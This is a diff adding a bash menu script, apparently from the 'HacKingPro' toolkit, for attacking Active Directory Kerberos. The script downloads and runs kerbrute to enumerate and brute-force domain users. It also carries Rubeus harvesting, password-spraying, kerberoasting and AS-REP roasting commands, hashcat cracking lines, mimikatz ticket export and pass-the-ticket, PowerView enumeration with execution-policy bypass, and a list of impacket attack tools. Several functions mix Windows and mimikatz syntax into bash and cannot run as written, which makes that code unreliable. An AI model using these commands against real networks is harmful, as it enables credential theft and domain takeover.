@@ -1,0 +1,233 @@
+#!/bin/sh
+#!/bin/bash
+#!/usr/bin/sh
+#!/usr/bin/bash
+#!/usr/bin/env sh
+#!/usr/bin/env bash
+#!/data/data/com.termux/files/usr/bin/sh
+#!/data/data/com.termux/files/usr/bin/bash
+###############################################################
+#                        Exploitation                         #
+#-Info--------------------------------------------------------#
+#    Enter Your Target, Hack Him, and Get Markdown Report     #
+#-About-------------------------------------------------------#
+#--╼▰[ Skils ]-╼▰[ MultiMan ]                                 #
+#--╼▰[ Part of ]-╼▰[ HacKingPro ]                             #
+#--╼▰[ Script Name ]-╼▰[ HacKingPro-AttacKerberos ]           #
+#--╼▰[ Author ]-╼▰[ AnLoMinus ]-╼▰[ Leon Yaakobov ]           #
+###############################################################
+# CREDIT: To All World Creators free Scripts & Tools          #
+# BIG THANX TO ALL COMUNITY THAT SHARE ALL THAT FREE          #
+# GREAT SCRIPTS                                               #
+# Location: Made With LOVE IN ISRAEL !                        #
+###############################################################
+#-Metadata----------------------------------------------------#
+#--╼▰[ Version ]-╼▰[ 1.0.0 ]                                  #
+#--╼▰[ Source ]-╼▰[ https://github.com/AnLoMinus/HacKingPro ] #
+#--╼▰[ Created ]-╼▰[ 18-08-2022 ]                             #
+#--╼▰[ Update ]-╼▰[ 18-08-2022 ]                              #
+###############################################################
+
+UnzipKerbrute(){
+  cd "${x_Menu_2_Winndows}"
+  if [ -e "kerbrute" ]; then
+    #statements
+    chmod +x kerbrute
+    ./kerbrute
+  else
+    #################################################
+    #         Installing Kerberos Tools
+    #################################################
+    # go get github.com/ropnop/kerbrute
+    wget https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_linux_amd64
+    mv kerbrute_linux_amd64 KerBrutePro
+    chmod +x KerBrutePro
+    ./KerBrutePro
+  fi
+  if [ "{$?}" == "1" ]; then
+    #statements
+    #statements
+    if [ -e "Kerbrute.zip" ]; then
+      #statements
+      unzip Kerbrute.zip; cd Kerbrute; make help; make all; ls dist/*;
+      # git clone https://github.com/ropnop/kerbrute.git
+    fi
+  fi
+  # if [ ${MySystem} = "linux" || ${MySystem} = "mac" ]; then
+  # fi
+}
+
+#--╼▰[ Main Menu ]--╼▰ [ 04 ]--╼▰ [ AttacK ]--╼▰ [ AttacKingKerberos ]
+# This will brute force kerberos user accounts from a domain controller using a supplied wordlist
+StartingKerbrute(){
+  cd "${x_Menu_2_Winndows}"
+  # If kerbrute exits; Start kerbrute
+  if [ -e "kerbrute" ]; then
+    clear
+    RunEnum="$(./kerbrute userenum --dc ${targetDns} -d ${targetDns} ${UserWordList})"
+    echo "${RunEnum}"
+    read -p "${Press_ENTER}"
+  else
+    clear
+    echo "   Kerbrute Not Found; Try Installing Before Starting.."
+    read -p "${Press_ENTER}"
+    break
+  fi
+}
+
+#--╼▰[ Main Menu ]--╼▰ [ 04 ]--╼▰ [ AttacK ]--╼▰ [ AttacKingKerberos ]
+AttacKingKerberos(){
+  AttacKerberos=$(echo "${BRed}Atta${BYellow}Ker${BBlue}Beros")
+  while true; do
+    clear
+    cd "${x_Menu_2_Winndows}"
+    ToolHeaderRun
+    TargetStatusRun
+    BruteAttackStatus
+    AttacKerberosMenuMain="$(echo "
+
+    ${BYellow}${faintT}┌──╼ ${resetT}${BRed}[${BYellow} ${AttacKerberos} ${BRed}]
+    ${BYellow}${faintT}|
+    ${BYellow}${faintT}|──┲─╼ ${resetT}${BRed}[${BYellow} i1 ${BRed}]${BYellow}${faintT}──╼ ${resetT}${BRed}[${BYellow} Install Kerbrute ${BRed}]
+    ${BYellow}${faintT}|  ┖────╼ ${BRed}[${BYellow} Installing Kerbrute ${BRed}]
+    ${BYellow}${faintT}|
+    ${BYellow}${faintT}|──┲─╼ ${resetT}${BRed}[${BYellow} s1 ${BRed}]${BYellow}${faintT}──╼ ${resetT}${BRed}[${BYellow} Start Kerbrute ${BRed}]
+    ${BYellow}${faintT}|  ┖─┲──╼ ${BRed}[${BYellow} Starting Kerbrute ${BRed}]
+    ${BYellow}${faintT}|    ┖──╼ ${BRed}[${BYellow} Enumerating Users ${BRed}]
+    ${BYellow}${faintT}|
+    ${BYellow}${faintT}└──╼${resetT}${BRed}[${DGrey} X ${BRed}]${BYellow}${faintT}──╼ ${resetT}${BRed}[${DGrey} Exit / Quit / Close ${BRed}]
+
+    ${BGreen}┌──${BRed}[${BCyan} Arsenal ${BRed}]${BYellow}╼▰  ${BRed}[${BCyan} Cheat Sheets ${BRed}]${BYellow}╼▰  ${BRed}[${BGreen} Command ${BRed}]${BYellow}╼▰  ${BRed}[${LGreen} $ArsenalCommand ${BRed}]
+    ${BGreen}|
+    ${BGreen}|──${BRed}[${DGrey} ~$(pwd) ${BRed}]
+    ${BGreen}|
+    ${BGreen}└──${BRed}[${BYellow} $(AnLoMinus) ${BRed}]${BYellow}╼▰  ${BRed}[${BGreen} ${HacKingPro} ${BRed}]${BYellow}╼▰  ${BRed}[${BGreen} Weaponization ${BRed}]${BYellow}╼▰  ${BRed}[${BGreen} ${AttacKerberos} ${BRed}]${BYellow}╼▰  ${BGreen}   ")"
+
+    read -p "$AttacKerberosMenuMain" cmd
+    case $cmd in
+      i1 )
+      UnzipKerbrute
+      ;;
+      s1 )
+      StartingKerbrute
+      ;;
+      "?"|help|about|About )
+      about
+      Press_ENTER
+      ;;
+      x|X|exit|quit|Exit )
+    clear
+    cd ${MainDirectoriy}
+    AwesomeLineExit
+    break
+    ;;
+      bp|BP|"brute plan"|"Brute Plan" )
+      User_WordlistLocation
+      ReadUserNameFromtheUser
+      Pass_WordlistLocation
+      ReadUserPassFromtheUser
+      ;;
+      p|P )
+    HacKingProPlanning
+    ;;
+      cl )
+    ClearTarget
+    ;;
+      ls )
+    lahs
+    ;;
+      * )
+    echo "$InvalidOption"
+    ;;
+  esac
+done
+}
+
+RubeusPro(){
+  # Example: 1
+  # This command tells Rubeus to harvest for TGTs every 30 seconds
+  Rubeus.exe harvest /interval:30
+
+  # in Windows CMD / Powershell, Add the IP and domain name to the hosts file
+  echo "${targetIP} CONTROLLER.local" >> C:\Windows\System32\drivers\etc\hosts
+  # This will take a given password and "spray" it against all found users then give the .kirbi TGT for that user
+  Rubeus.exe brute /password:Password1 /noticket
+
+  # This will dump the Kerberos hash of any kerberoastable users
+  Rubeus.exe kerberoast
+
+  # CracKing hash.txt
+  hashcat -m 13100 -a 0 hash.txt Pass.txt
+
+  # This will run the AS-REP roast command looking for vulnerable users and then dump found vulnerable user hashes.
+  Rubeus.exe asreproast
+
+  # crack those hashes! Rubeus AS-REP Roasting uses hashcat mode 18200
+  hashcat -m 18200 hash.txt Pass.txt
+
+
+
+}
+MimikatzPro(){
+  # run mimikatz
+  mimikatz.exe
+  # Ensure this outputs [output '20' OK] if it does not that means you do not have the administrator privileges to properly run mimikatz
+  privilege::debug
+  # - this will export all of the .kirbi tickets into the directory that you are currently in At this step you can also use the base 64 encoded tickets from Rubeus that we harvested earlier
+  sekurlsa::tickets /export
+  # run this command inside of mimikatz with the ticket that you harvested from earlier. It will cache and impersonate the given ticket
+  kerberos::ptt <ticket>
+  # Here were just verifying that we successfully impersonated the ticket by listing our cached tickets.
+  klist
+
+
+
+
+}
+KerBrutePro(){
+# Enumerating Users with Kerbrute
+# Example: 1
+KerBrutePro userenum --dc ${targetDns} -domain ${targetDns} Users.txt
+# Example: 2
+# This will brute force user accounts from a domain controller using a supplied wordlist
+./kerbrute userenum --dc CONTROLLER.local -d CONTROLLER.local User.txt
+}
+PowershellPro(){
+  # 1.) Start Powershell -
+  powershell -ep bypass
+  # -ep bypasses the execution policy of powershell allowing you to easily run scripts
+  # 2.) Start PowerView -
+  .\PowerView.ps1
+  # 3.) Enumerate the domain users -
+  Get-NetUser | select cn
+  # 4.) Enumerate the domain groups -
+  Get-NetGroup -GroupName *admin*
+  # Here's a cheatsheet to help you with commands: https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993
+  # https://gist.githubusercontent.com/HarmJ0y/184f9822b195c52dd50c379ed3117993/raw/e5e30c942adb2347917563ef0dafa7054882535a/PowerView-3.0-tricks.ps1
+}
+Commands(){
+  # Copy File To Destination Vicitm
+  scp ${Source_File_Location} ${targetUserName}@${targetIP}:${Destination_File_Location}
+
+# impakets
+echo "
+impacket-addcomputer        impacket-mimikatz           impacket-samrdump
+impacket-atexec             impacket-mqtt_check         impacket-secretsdump
+impacket-dcomexec           impacket-mssqlclient        impacket-services
+impacket-dpapi              impacket-mssqlinstance      impacket-smbclient
+impacket-esentutl           impacket-netview            impacket-smbexec
+impacket-exchanger          impacket-nmapAnswerMachine  impacket-smbrelayx
+impacket-findDelegation     impacket-ntfs-read          impacket-smbserver
+impacket-GetADUsers         impacket-ntlmrelayx         impacket-sniff
+impacket-getArch            impacket-ping               impacket-sniffer
+impacket-GetNPUsers         impacket-ping6              impacket-split
+impacket-getPac             impacket-psexec             impacket-ticketConverter
+impacket-getST              impacket-raiseChild         impacket-ticketer
+impacket-getTGT             impacket-rdp_check          impacket-wmiexec
+impacket-GetUserSPNs        impacket-reg                impacket-wmipersist
+impacket-goldenPac          impacket-registry-read      impacket-wmiquery
+impacket-karmaSMB           impacket-rpcdump
+impacket-kintercept         impacket-rpcmap
+impacket-lookupsid          impacket-sambaPipe
+"
+}
